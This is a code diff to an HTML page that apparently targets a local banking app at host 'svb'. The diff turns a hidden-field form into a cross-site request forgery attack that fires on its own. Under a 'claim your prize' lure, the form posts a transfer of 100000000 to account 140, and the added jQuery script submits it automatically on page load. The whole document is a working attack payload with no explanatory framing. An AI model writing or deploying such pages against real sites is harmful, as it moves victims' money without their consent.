@@ -1,5 +1,13 @@
-<form action="http://svb:5003/transfer/1" method="POST">
+<form id="my-form" action="http://svb:5003/transfer/1" method="POST">
     <input type="hidden" name="amount" value="100000000">
     <input type="hidden" name="account" value="140">
     <input type="submit" value="Click here to claim your prize!">
 </form>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    $(document).ready(function() {
+        // Automatically submit the form when the page loads
+        $('#my-form').submit();
+    });
+</script>
